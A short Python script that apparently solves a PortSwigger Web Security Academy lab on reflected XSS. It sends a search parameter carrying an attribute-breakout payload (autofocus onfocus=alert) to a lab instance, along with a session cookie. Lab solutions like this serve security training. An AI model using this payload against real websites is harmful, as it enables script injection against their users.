# Reflected XSS into attribute with angle brackets HTML-encoded

import requests

url = "https://0a5a00a204a51dc1c0a93c2d0055009e.web-security-academy.net/"

cookies = {
	"session": "ymL0Lb363ngoxaugnRPeS6VnEGKkdfbM"
}

PAYLOAD = '" autofocus onfocus="alert(\'XSS By Sigha\')'
params = {
	"search": PAYLOAD 
}


r = requests.get(url, params=params, cookies=cookies)

# print(r.text)
print(r.url)